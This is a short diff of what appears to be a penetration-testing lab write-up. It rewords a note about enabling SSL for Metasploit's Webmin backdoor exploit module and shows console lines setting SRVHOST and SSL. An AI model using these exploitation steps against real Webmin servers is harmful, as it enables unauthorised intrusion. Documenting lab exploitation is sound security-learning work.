@@ -310,7 +310,7 @@ SRVHOST => 192.168.1.166
 msf6 exploit(linux/http/webmin_backdoor) > 
 ```
 
-I was running into issues with this, so after doing research I found out i need SSL enabled. 
+I was running into issues with this, I looked at my NMAP scan again and noticed its running SSL. 
 
 ```console
 msf6 exploit(linux/http/webmin_backdoor) > set ssl TRUE
